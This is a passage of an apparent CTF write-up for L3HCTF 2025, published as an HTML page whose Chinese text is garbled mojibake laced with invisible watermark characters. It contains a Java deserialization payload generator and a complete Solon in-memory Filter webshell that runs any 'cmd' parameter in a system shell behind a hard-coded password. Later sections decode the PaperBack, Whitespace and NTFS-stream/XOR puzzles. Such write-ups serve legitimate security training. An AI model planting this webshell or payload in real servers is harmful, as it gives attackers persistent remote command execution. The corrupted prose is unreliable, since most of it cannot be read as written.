<p>æ„é€ ä¸€ä¸ªæ»¡è¶³è¦æ±‚çš„å“ˆå¸Œç¢°æ’ï¼Œç„¶åç›´æ¥é‡å†™è¯¥ç±»çš„ <span class="hexo-wm">ğ˜€â€Â³ğ¯ğ˜¦nâˆ™â€Œâ€Œğ¬iâ€â€‹ğ­â„®â€Œï»¿</span>writeObject æ–¹æ³•ï¼ŒæŒ‰ç…§å¯¹åº”è¦æ±‚é¡ºåºå†™å…¥ååºåˆ—åŒ–æµå³å¯ï¼š</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectOutputStream</span> out<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>  
    <span class="token class-name">Field</span> info <span class="token operator">=</span> <span class="token class-name">TangYingGouModel</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"information"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    info<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    info<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>exp<span class="token punctuation">.</span><span class="token function">buildSolonMasterChain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
    out<span class="token punctuation">.</span><span class="token function">writeUTF</span><span class="token punctuation">(</span><span class="token string">"ç½‘ç»œå®‰å…¨å† å†›2025"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    out<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span><span class="token number">1796</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    out<span class="token punctuation">.</span><span class="token function">writeUTF</span><span class="token punctuation">(</span><span class="token function">getYour_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    out<span class="token punctuation">.</span><span class="token function">writeUTF</span><span class="token punctuation">(</span><span class="token function">getYour_passwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
    out<span class="token punctuation">.</span><span class="token function">defaultWriteObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span></code></pre>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>  
    <span class="token class-name">TangYingGouModel</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TangYingGouModel</span><span class="token punctuation">(</span><span class="token string">"GSVCtfUl"</span><span class="token punctuation">,</span> <span class="token string">"VCJGf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

    <span class="token class-name">ByteArrayOutputStream</span> bos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>bos<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

    <span class="token class-name">String</span> base64 <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>bos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>base64<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"payload length = "</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
<span class="token punctuation">}</span></code></pre>
<h2 id="5-6-solon-å†…å­˜é©¬æ„é€ "><a href="#5-6-solon-å†…å­˜é©¬æ„é€ " class="headerlink" title="5.6 solon å†…å­˜é©¬æ„é€ "></a>5.6 solon å†…å­˜é©¬æ„é€ </h2><p>ç”±äºç›®æ ‡é¶æœºä¸å‡ºç½‘ï¼Œéœ€è¦ç¼–å†™ä¸€ä¸ª solon <span class="hexo-wm">ğ˜€â€‹ğŸ¯â…´enâ€¤ï»¿sï½‰â€ğ˜µï½…ï»¿â€‹</span>çš„ Filter å†…å­˜é©¬ï¼š</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span></span><span class="token class-name">Solon</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">Filter</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">FilterChain</span></span><span class="token punctuation">;</span>  
  
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FilterShell</span>  <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>  
    <span class="token keyword">static</span> <span class="token punctuation">{</span>  
        <span class="token keyword">try</span> <span class="token punctuation">{</span>  
            <span class="token class-name">Solon</span><span class="token punctuation">.</span><span class="token function">app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chainManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addFilter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FilterShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  
  
    <span class="token annotation punctuation">@Override</span>  
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>  
  
    <span class="token punctuation">}</span>  
  
    <span class="token annotation punctuation">@Override</span>  
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>  
  
    <span class="token punctuation">}</span>  
  
  
    <span class="token annotation punctuation">@Override</span>  
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">Context</span> ctx<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">{</span>  
        <span class="token keyword">try</span><span class="token punctuation">{</span>  
            <span class="token keyword">if</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span><span class="token function">param</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"s3ven"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
                <span class="token class-name">String</span> str <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">param</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
                <span class="token keyword">try</span><span class="token punctuation">{</span>  
                    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmds <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> str<span class="token punctuation">}</span> <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> str<span class="token punctuation">}</span><span class="token punctuation">;</span>  
                    <span class="token class-name">String</span> output <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span>cmds<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
                    ctx<span class="token punctuation">.</span><span class="token function">output</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>  
                <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
                <span class="token punctuation">}</span>  
            <span class="token punctuation">}</span>  
        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>  
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"å¼‚å¸¸ï¼š"</span><span class="token operator">+</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
        chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span></code></pre>
<p>å°†å…¶ç¼–è¯‘æˆå­—èŠ‚ç å¹¶å†™å…¥ <code>TemplatesImpl</code> çš„ <code>_bytecodes</code> å±æ€§å³å¯</p>
<h1 id="6-PaperBack"><a href="#6-PaperBack" class="headerlink" title="6. PaperBack"></a>6. PaperBack</h1><p>é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p>Someone thought paper could replace a CD. Turns outâ€¦ they werenâ€™t entirely wrong. Can you read <span class="hexo-wm">sâ€Œâ€‹â‘¶â…´ğ˜¦ğ§Â·<span class="hexo-wm">ğ˜´â€Œâ€â‘¶ğ¯â„¯ğ’âˆ™â€ŒÑ•ğ˜ªâ€‹ï»¿tâ„®â€Œï»¿</span>â€‹â€ğ˜€iâ€Œï½”eâ€‹</span>between the dots? Btw, I really like OllyDbg.</p>
</blockquote>
<h2 id="6-1-PaperBack-è§£å¯†"><a href="#6-1-PaperBack-è§£å¯†" class="headerlink" title="6.1 PaperBack è§£å¯†"></a>6.1 PaperBack è§£å¯†</h2><p>æ ¹æ®é¢˜ç›®æè¿° <code>OllyDbg</code> å’Œé¢˜ç›®åç§° <code>PaperBack</code> æ‰¾åˆ° <a href="https://www.ollydbg.de/Paperbak/">PAPERBACK<span class="hexo-wm">ğ˜€â€Œâ€Œâ‘¶â…´eğ§Â·â€‹êœ±iâ€Œâ€Œteâ€â€</span> v1.10</a>ï¼š<br><img src="image-14.png" alt="image-14.png"></p>
<p>çœ‹èµ·æ¥æ˜¯å°†æ•°æ®é€šè¿‡ç‰¹å®šå½¢å¼è¿›è¡Œç¼–ç å¹¶å†™å…¥çº¸å¼ ä¸Šè¿›è¡Œå¤‡ä»½çš„ç¨‹åºï¼Œ<span class="hexo-wm">Ñ•â€ŒğŸ¯ğ’—ğğ§â€¢â€ğ˜´ï½‰ï»¿ï»¿ğ­â„®â€‹</span>å°†é™„ä»¶æ”¾å…¥ç¨‹åºä¸­è§£å¯†åå¾—åˆ°ä¸€ä¸ª flag.ws æ–‡ä»¶</p>
<p><img src="image-15.png" alt="image-15.png"></p>
<h2 id="6-2-Whitespace-Language-è§£å¯†"><a href="#6-2-Whitespace-Language-è§£å¯†" class="headerlink" title="6.2 Whitespace Language è§£å¯†"></a>6.2 Whitespace Language è§£å¯†</h2><p>æ ¹æ®æ–‡ä»¶åç¼€å’Œæ–‡ä»¶å†…å®¹å¾—çŸ¥ flag.ws <span class="hexo-wm">ğ’”â€‹3â…´ğ˜¦nï¼â€ï»¿ğ˜´ï½‰â€‹â€‹teï»¿</span>ä½¿ç”¨çš„æ˜¯ Whitespace Languageï¼Œä½¿ç”¨ <a href="https://www.dcode.fr/whitespace-language">https://www.dcode.fr/whitespace-language</a> è§£å¯†</p>
<p><img src="image-16.png" alt="image-16.png"></p>
<p>è·å¾— flagï¼š<code>L3HCTF{welcome_to_l3hctf2025}</code></p>
<h1 id="7-é‡å­åŒç”Ÿå½±"><a href="#7-é‡å­åŒç”Ÿå½±" class="headerlink" title="7. é‡å­åŒç”Ÿå½±"></a>7. é‡å­åŒç”Ÿå½±</h1><p>é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p>ç‰¹å®šçš„è§‚æµ‹ä»ªå¼èƒ½è®©é‡<span class="hexo-wm">ğ˜´ï»¿â€ğŸ¯vâ„¯ğ§ï¼â€ŒÑ•ğ˜ªï»¿ğ˜µâ„®â€Œâ€‹</span>å çš„é‡å­æ€åç¼©å‡º Flag</p>
</blockquote>
<h2 id="7-1-NTFS-æ•°æ®æµè§£å¯†"><a href="#7-1-NTFS-æ•°æ®æµè§£å¯†" class="headerlink" title="7.1 NTFS æ•°æ®æµè§£å¯†"></a>7.1 NTFS æ•°æ®æµè§£å¯†</h2><blockquote>
<p>NTFS æ–‡ä»¶ç³»ç»Ÿå…è®¸ä¸€ä¸ªæ–‡ä»¶æ‹¥æœ‰å¤šä¸ªâ€œæ•°æ®æµâ€ã€‚æ™®é€šæ–‡ä»¶å†…å®¹å­˜æ”¾åœ¨é»˜è®¤ï¼ˆUnnamedï¼‰æ•°æ®æµä¸­ï¼Œè€Œé¢å¤–æµç”¨ <code>æ–‡ä»¶å:æµå</code> å½¢å¼å¼•ç”¨ï¼Œé€šè¿‡æŠŠæ•°æ®å†™å…¥æ™®é€šæ–‡ä»¶çš„é¢å¤–æµä¸­ï¼Œ<span class="hexo-wm">sï»¿ï»¿ğŸ¯ğ’—ğï½ï¼ï»¿ï»¿ğ¬ğ¢â€â€Œtğ˜¦â€‹</span>å¯ä»¥è¾¾åˆ°éšå†™çš„ç›®çš„ã€‚</p>
</blockquote>
<p>å°†ä¸‹è½½çš„é™„ä»¶ç›´æ¥ä½¿ç”¨å‹ç¼©å·¥å…·æ‰“å¼€å¯ä»¥çœ‹åˆ°å­˜åœ¨ <span class="hexo-wm">ğ’”ï»¿ï»¿Â³ğ’—ğğ§.â€‹Ñ•ğ¢â€‹ğ­eâ€</span>NTFS æ•°æ®æµæ–‡ä»¶ï¼š<br><img src="image-17.png" alt="image-17.png"></p>
<p>è§£å‹åè·å¾—ä¸¤å¼  <span class="hexo-wm">êœ±ï»¿â€‹â‘¶ğ˜·â„¯ğ’â€¢â€‹Ñ•iï»¿ğ˜µğ˜¦â€â€Œ</span>webp å›¾ç‰‡</p>
<h2 id="7-2-å¯†é’¥è§£å¯†"><a href="#7-2-å¯†é’¥è§£å¯†" class="headerlink" title="7.2 å¯†é’¥è§£å¯†"></a>7.2 å¯†é’¥è§£å¯†</h2><p><img src="image-18.webp" alt="image-18.webp"><br>æ‰«æç¬¬ä¸€å¼ å›¾ç‰‡ stream2.<span class="hexo-wm">ğ˜€â€3vğ˜¦ï½ï¼â€sâ…ˆï»¿â€tâ„®ï»¿â€‹</span>webp ï¼Œè·å¾—ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<pre class="language-none"><code class="language-none">flag is not here, but I can give you the key: "quantum"</code></pre>
<p>è·å¾— xor key <code>quantum</code></p>
<h2 id="7-3-å¼‚æˆ–è§£å¯†"><a href="#7-3-å¼‚æˆ–è§£å¯†" class="headerlink" title="7.3 å¼‚æˆ–è§£å¯†"></a>7.3 å¼‚æˆ–è§£å¯†</h2><p>æ ¹æ®é¢˜ç›®æè¿°çš„æç¤ºå’Œå¯†é’¥è§£å¯†è·å¾—çš„ä¿¡æ¯ï¼Œ<span class="hexo-wm">Ñ•â€ŒğŸ¯ğ’—â„®ğ’ï¼â€Œğ’”iï»¿ï»¿ï½”ï½…â€ï»¿</span>å°†é™„ä»¶ä¸¤å¼ å›¾ç‰‡è¿›è¡Œ xor ï¼Œå¹¶ä¸ key è¿›è¡Œä¸€æ¬¡ xor å³å¯è§£å¯†è·å¾—åŸå›¾ï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np

img1 <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"stream2.webp"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span>
img2 <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"stream2.webp_stream1.webp"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span>

xor_img <span class="token operator">=</span> np<span class="token punctuation">.</span>bitwise_xor<span class="token punctuation">(</span>img1<span class="token punctuation">,</span> img2<span class="token punctuation">)</span>

key_bytes <span class="token operator">=</span> np<span class="token punctuation">.</span>frombuffer<span class="token punctuation">(</span><span class="token string">b"quantum"</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span>
xor_img <span class="token operator">^</span><span class="token operator">=</span> np<span class="token punctuation">.</span>resize<span class="token punctuation">(</span>key_bytes<span class="token punctuation">,</span> xor_img<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

Image<span class="token punctuation">.</span>fromarray<span class="token punctuation">(</span>xor_img<span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"xor_result.webp"</span><span class="token punctuation">)</span></code></pre>

<p><img src="image-19.webp" alt="image-19.webp"></p>
<p>æ‰«æåè·å¾— flagï¼š<code>L3HCTF{Quantum_ADS_XOR}</code></p>
</body></html>
        </div>
        
          <div class="prev-or-next">
            <div class="post-foot-next">
              
                <a href="../%E7%AC%AC%E4%B8%80%E5%B1%8A-openharmony-ctf-writeup/" target="_self">
                  <i class="iconfont icon-chevronleft"></i>
                  <span>ä¸Šä¸€é¡µ</span>
                </a>
              
            </div>
            <div class="post-foot-prev">
              
                <a href="../2025-ciscn-final-writeup/" target="_self">
                  <span>ä¸‹ä¸€é¡µ</span>
                  <i class="iconfont icon-chevronright"></i>
                </a>
              
            </div>
          </div>
        
      </div>
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="catalog-zoom">
      <div class="title">ç›®å½•</div>
      <div class="catalog-content">
        
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E8%B5%9B%E5%8D%9A%E4%BE%A6%E6%8E%A2"><span class="toc-text">1. èµ›åšä¾¦æ¢</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E5%9C%B0%E5%9D%80"><span class="toc-text">1.1 æ‰¾å›å¯†ç åœ°å€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80"><span class="toc-text">1.2 é‚®ç®±åœ°å€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-%E8%80%81%E5%AE%B6%E5%9F%8E%E5%B8%82%E5%92%8C%E8%8B%B1%E6%96%87%E5%A7%93%E5%90%8D"><span class="toc-text">1.3 è€å®¶åŸå¸‚å’Œè‹±æ–‡å§“å</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-%E5%AE%B6%E9%87%8C%E5%BA%97%E9%93%BA%E4%BD%8D%E7%BD%AE"><span class="toc-text">1.4 å®¶é‡Œåº—é“ºä½ç½®</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-5-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E4%BB%BB%E8%AF%BB"><span class="toc-text">1.5 ç›®å½•ç©¿è¶Šä»»è¯»</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-best-profile"><span class="toc-text">2. best_profile</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">2.1 SSTI æ¨¡æ¿æ³¨å…¥æ¼æ´</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-xff-%E5%A4%B4%E4%BC%AA%E9%80%A0-last-ip"><span class="toc-text">2.2 xff å¤´ä¼ªé€  last_ip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-nginx-%E9%A1%B5%E9%9D%A2%E7%BC%93%E5%AD%98%E5%88%A9%E7%94%A8"><span class="toc-text">2.3 nginx é¡µé¢ç¼“å­˜åˆ©ç”¨</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-gateway-advance"><span class="toc-text">3. gateway_advance</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-OpenResty-%E5%8F%82%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-text">3.1 OpenResty å‚æ•°æº¢å‡ºæ¼æ´</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-Range-%E5%A4%B4%E7%BB%95%E8%BF%87-WAF"><span class="toc-text">3.2 Range å¤´ç»•è¿‡ WAF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-download-%E8%B7%AF%E7%94%B1-fd-%E8%AF%BB-password"><span class="toc-text">3.3 download è·¯ç”± fd è¯» password</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-read-anywhere-%E8%B7%AF%E7%94%B1%E8%AF%BB%E5%86%85%E5%AD%98-flag"><span class="toc-text">3.4 read_anywhere è·¯ç”±è¯»å†…å­˜ flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-gogogo%E5%87%BA%E5%8F%91%E5%96%BD"><span class="toc-text">4. gogogoå‡ºå‘å–½</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-text">4.1 æ–‡ä»¶ä¸Šä¼ æ¼æ´</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-CVE-2021-3129"><span class="toc-text">4.2 CVE-2021-3129</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-Laravel-phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">4.3 Laravel phar ååºåˆ—åŒ–</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-openssl-%E6%8F%90%E6%9D%83"><span class="toc-text">4.4 openssl ææƒ</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-TellMeWhy"><span class="toc-text">5. TellMeWhy</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-ip-%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87"><span class="toc-text">5.1 ip æ£€æµ‹ç»•è¿‡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-json-%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E7%BB%95%E8%BF%87"><span class="toc-text">5.2 json è§£æå·®å¼‚ç»•è¿‡</span></a></li><li 